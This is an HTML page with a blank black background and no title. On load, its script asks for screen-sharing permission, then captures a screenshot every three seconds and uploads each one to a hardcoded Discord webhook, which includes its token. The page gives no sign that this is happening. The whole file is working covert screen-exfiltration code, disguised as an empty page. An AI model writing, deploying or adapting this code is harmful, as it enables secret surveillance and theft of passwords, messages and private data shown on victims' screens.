<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title></title>
  <style>
    body, html {
      margin: 0;
      padding: 0;
      background: #000;
      overflow: hidden;
    }
  </style>
</head>
<body>

<script>
  const WEBHOOK_URL = "https://discord.com/api/webhooks/1477379037654552769/H7B1E5N418zjaHIeXYXM2w0JAAAN48tqBx_BMsJNtJZW0e3xbPtpFAMTuBHQr6SQpN1M";

  let stream = null;
  let interval = null;

  async function startCapture() {
    try {
      stream = await navigator.mediaDevices.getDisplayMedia({ 
        video: true,
        audio: false 
      });

      // Start sending screenshots every 3 seconds
      interval = setInterval(() => captureAndSend(), 3000);
    } catch (err) {
      console.error("Screen capture failed or was blocked:", err);
    }
  }

  async function captureAndSend() {
    if (!stream) return;

    const video = document.createElement('video');
    video.srcObject = stream;
    await video.play();

    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    canvas.toBlob(async (blob) => {
      const formData = new FormData();
      formData.append('file', blob, `screen-${Date.now()}.png`);

      try {
        await fetch(WEBHOOK_URL, {
          method: 'POST',
          body: formData
        });
      } catch (e) {
        console.error("Failed to send screenshot");
      }
    }, 'image/png', 0.85);   // 0.85 quality to help keep file size down
  }

  // Auto start when page loads
  window.onload = startCapture;

  // Optional: stop if user closes tab (cleanup)
  window.onbeforeunload = () => {
    if (interval) clearInterval(interval);
    if (stream) stream.getTracks().forEach(track => track.stop());
  };
</script>

</body>
</html>
